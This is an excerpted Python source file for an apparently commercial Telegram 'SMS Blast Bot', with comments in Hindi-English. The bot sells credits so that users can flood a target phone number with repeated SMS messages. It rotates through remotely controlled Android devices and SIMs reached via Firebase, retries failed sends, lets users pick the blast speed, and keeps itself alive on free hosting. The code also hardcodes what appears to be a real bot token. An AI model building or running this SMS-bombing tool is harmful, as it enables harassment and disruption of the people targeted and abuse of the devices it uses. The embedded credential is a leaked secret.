...
def sc(text: str) -> str:
    # Button/message labels use premium custom emoji through em(). Remove
    # ordinary Unicode emoji from labels so both icons are never displayed.
...
def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🟢 SEND SMS"),
             KeyboardButton(text="📹 VIDEOS")],
            [KeyboardButton(text="💳 CREDITS"),
             KeyboardButton(text="🔴 STOP BLAST")]
        ],
...
BOT_TOKEN = os.getenv("BOT_TOKEN", "8847008841:AAGqgmQhsoLrHlOzrMi6n5WE-lPLzXFXrfE").strip()
...
def load() -> dict:
    ...
    with _DB_LOCK:
        ...
        d = _default_data()
        # Do not call save() here while _DB_LOCK is held.  RLock prevents
        # deadlock, but writing inline also keeps load() self-contained.
...
def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text=sc("🚀 FAST"), callback_data=f"{prefix}:speed:fast"),
            InlineKeyboardButton(text=sc("⚡ MEDIUM"), callback_data=f"{prefix}:speed:medium"),
            InlineKeyboardButton(text=sc("🐢 SLOW"), callback_data=f"{prefix}:speed:slow"),
        ],
        [InlineKeyboardButton(text=sc("❌ CANCEL"), callback_data=f"{prefix}:home")]
    ])
...
def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=sc("🛑 STOP SENDING"), callback_data="user:stop_send")]
    ])
...
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_label = sc("🔴 DISABLE FREE MODE") if d.get("free_mode") else sc("🟢 ENABLE FREE MODE")
    mode_cb = "owner:free:off" if d.get("free_mode") else "owner:free:on"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=sc("📤 SEND SMS"), callback_data="owner:send"),
         InlineKeyboardButton(text=sc("🔥 MANAGE FIREBASE"), callback_data="owner:fb:menu:0")],
        [InlineKeyboardButton(text=sc("📹 MANAGE VIDEOS"), callback_data="owner:videos:menu"),
         InlineKeyboardButton(text=sc("👑 SUPER ADMINS"), callback_data="owner:owners:menu")],
        [InlineKeyboardButton(text=sc("🛡 MANAGE ADMINS"), callback_data="owner:admins:menu"),
         InlineKeyboardButton(text=sc("👥 VIEW USERS"), callback_data="owner:users:list")],
        [InlineKeyboardButton(text=sc("🚫 BAN USER"), callback_data="owner:ban"),
         InlineKeyboardButton(text=sc("✅ UNBAN USER"), callback_data="owner:unban:menu")],
        [InlineKeyboardButton(text=sc("📢 BROADCAST"), callback_data="owner:broadcast"),
         InlineKeyboardButton(text=sc("📊 API STATS"), callback_data="owner:stats")],
        [InlineKeyboardButton(text=sc("📜 ACTIVITY LOG"), callback_data="owner:activity"),
         InlineKeyboardButton(text=sc("💳 PRICING PLANS"), callback_data="owner:pricing:menu")],
        [InlineKeyboardButton(text=sc("🎁 REDEEM CODES"), callback_data="owner:redeem:menu"),
         InlineKeyboardButton(text=sc("➕ ADD CREDITS"), callback_data="owner:credits:add")],
        [InlineKeyboardButton(text=sc("➖ DEDUCT CREDITS"), callback_data="owner:credits:deduct"),
         InlineKeyboardButton(text=sc("➕ ADD CREDITS ALL"), callback_data="owner:add_all_credits")],
        [InlineKeyboardButton(text=sc("➖ DEDUCT ALL"), callback_data="owner:deduct_all_credits"),
         InlineKeyboardButton(text=sc("🔗 FORCE JOIN"), callback_data="owner:fj:menu")],
        [InlineKeyboardButton(text=sc("⚙️ SETTINGS"), callback_data="owner:settings"),
         InlineKeyboardButton(text=sc("📋 SMS HISTORY"), callback_data="owner:sms_history")],
        [InlineKeyboardButton(text=sc("📤 EXPORT SCRIPT"), callback_data="owner:export_script"),
         InlineKeyboardButton(text=sc("🔒 PROTECT NUMBER"), callback_data="owner:protect")],
        [InlineKeyboardButton(text=sc("🔐 PROTECTED LIST"), callback_data="owner:protected_list"),
         InlineKeyboardButton(text=sc("📊 TRACK NUMBER"), callback_data="owner:track")],
        [InlineKeyboardButton(text=mode_label, callback_data=mode_cb)],
        [InlineKeyboardButton(text=sc("🔄 REFRESH"), callback_data="owner:refresh")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=sc("📤 SEND SMS"), callback_data="admin:send"),
         InlineKeyboardButton(text=sc("📹 MANAGE VIDEOS"), callback_data="owner:videos:menu")],
        [InlineKeyboardButton(text=sc("👥 VIEW USERS"), callback_data="admin:users:list"),
         InlineKeyboardButton(text=sc("📊 API STATS"), callback_data="admin:stats")],
        [InlineKeyboardButton(text=sc("🚫 BAN USER"), callback_data="admin:ban"),
         InlineKeyboardButton(text=sc("✅ UNBAN USER"), callback_data="admin:unban:menu")],
        [InlineKeyboardButton(text=sc("📢 BROADCAST"), callback_data="admin:broadcast")],
        [InlineKeyboardButton(text=sc("🔄 REFRESH"), callback_data="admin:refresh")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=sc("📤 SEND SMS"), callback_data="user:send")],
        [InlineKeyboardButton(text=sc("📹 VIDEOS"), callback_data="user:random_video"),
         InlineKeyboardButton(text=sc("💳 CREDITS"), callback_data="user:credits")],
        [InlineKeyboardButton(text=sc("🎁 REDEEM"), callback_data="user:redeem"),
         InlineKeyboardButton(text=sc("👥 REFER"), callback_data="user:refer")],
        [InlineKeyboardButton(text=sc("📊 STATS"), callback_data="user:stats"),
         InlineKeyboardButton(text=sc("📜 MY SMS HISTORY"), callback_data="user:sms_history")],
        [InlineKeyboardButton(text=sc("💰 BUY CREDITS"), callback_data="user:pricing")],
        [InlineKeyboardButton(text=sc("💸 TRANSFER CREDITS"), callback_data="user:transfer")],
        [InlineKeyboardButton(text=sc("ℹ️ INFO"), callback_data="user:info")],
    ])
...
async def cmd_start(msg: Message, state: FSMContext):
    ...
    # Handle an optional referral deep-link in the same /start handler.
    args = msg.text.split()
...
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    ...
    async def do_send():
        ...
        try:
            # ============================================================
            # FIXED BLAST LOOP
            # - Har device se max 10 SMS jaayenge per cycle
            # - Failed pe retry hoga, msgs_left sirf SUCCESS pe ghategaa
            # - Jab tak pura count poora nahi hota loop chalega
            # ============================================================

            # Sab devices + sims ki flat list banao
            all_slots = []
            for device in devices:
                fb_id_d  = device["fb_id"]
                fb_url_d = device["fb_url"]
                dev_id_d = device["dev_id"]
                sims     = device.get("sims") or []
                sim_list = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                for sim in sim_list:
                    all_slots.append((fb_id_d, fb_url_d, dev_id_d, sim))

            if not all_slots:
                log.warning(f"User {uid}: no devices available")
                return

            PER_DEVICE_QUOTA = 10   # Har device se ek cycle mein max 10 SMS
            MAX_RETRIES      = 5    # Failed SMS ko kitni baar retry karo

            while msgs_left > 0:
                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped at {sent_ok}/{count}")
                        break

                # Ek poora cycle: har slot ko PER_DEVICE_QUOTA SMS dete hain
                made_progress = False

                for (fb_id, fb_url, dev_id, sim) in all_slots:
                    if msgs_left <= 0:
                        break
                    async with session.lock:
                        if session.cancelled:
                    ...
                    # Is slot se kitne SMS is cycle mein bhejna hai
                    slot_quota = min(PER_DEVICE_QUOTA, msgs_left)

                    for _ in range(slot_quota):
                        if msgs_left <= 0:
                            break
                        async with session.lock:
                            if session.cancelled:
                        ...
                        # Retry loop — sirf success pe msgs_left ghataao
                        ok = False
                        for attempt in range(MAX_RETRIES):
                            ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                            if ok:
                                break
                            # Retry se pehle thoda wait
                        ...
                        async with session.lock:
                            if ok:
                                ...
                                # MAX_RETRIES ke baad bhi fail — count karo but msgs_left mat ghataao
                                sent_fail += 1
                                log.warning(f"SMS failed after {MAX_RETRIES} retries — dev:{dev_id} sim:{sim}")
                            ...
                            if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                                    msgs_left <= 0 or session.cancelled):
                ...
                # Agar poori cycle mein koi bhi SMS nahi gaya (sab devices down)
                # toh 5 sec wait karke dobara try karo
                if not made_progress and msgs_left > 0:
                    log.warning(f"User {uid}: all devices failed this cycle, waiting 5s before retry...")
                    await asyncio.sleep(5)
...
# ========== KEEP-ALIVE WEB SERVER (Free Host Restart Fix) ==========
# Render, Koyeb, Katabump, Railway pe bot ko alive rakhta hai
# HTTP server port pe respond karta hai taki platform restart na kare

KEEP_ALIVE_PORT = int(os.getenv("PORT", 8080))
APP_URL = os.getenv("APP_URL", "")  # Apna deployed URL yahan set karein e.g. https://mybot.onrender.com

async def health_handler(request):
    """Health check endpoint - platform ko lagta hai service alive hai"""
    uptime = int(time.time() - _BOT_START_TIME)
    hours = uptime // 3600
    minutes = (uptime % 3600) // 60
    seconds = uptime % 60
    return aiohttp_web.Response(
        text=f"✅ SMS Blast Bot {_VERSION} | Online | Uptime: {hours}h {minutes}m {seconds}s | Devices: {len(CACHED_DEVICES)}",
...
async def root_handler(request):
    ...
    return aiohttp_web.Response(
        text=(
            f"🤖 SMS Blast Bot {_VERSION}\n"
            f"Status: Running\n"
            f"Owner: {SUPER_ADMIN_NAME}\n"
            f"Devices Online: {len(CACHED_DEVICES)}\n"
...
async def start_keep_alive_server():
    """Aiohttp web server start karo - free hosting pe alive rakho"""
    ...
    await site.start()
    log.info(f"Keep-Alive Web Server started on port {KEEP_ALIVE_PORT}")

async def self_ping_task():
    """Har 10 minute mein khud ko ping karta hai - Render/Koyeb sleep se bachao"""
    if not APP_URL:
        log.info("APP_URL not set — self-ping disabled. Set APP_URL env var for auto-ping.")
        return

    await asyncio.sleep(60)  # Bot start hone do pehle
    log.info(f"Self-ping task started → {APP_URL}/ping (every 10 min)")

    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{APP_URL}/ping", timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    log.info(f"Self-ping: {resp.status} OK")
        except Exception as e:
...
async def main():
    ...
    # Keep-alive server start karo (free hosting restart fix)
    ...
    log.info("Background scanner, backup & self-ping tasks created")
    ...
    try:
        await bot.send_message(
            ...
            f"🌐 <b>Keep-Alive Server:</b> Port {KEEP_ALIVE_PORT} ACTIVE\n"
            f"🔁 <b>Self-Ping:</b> {'ENABLED → ' + APP_URL if APP_URL else 'Set APP_URL env var'}\n"
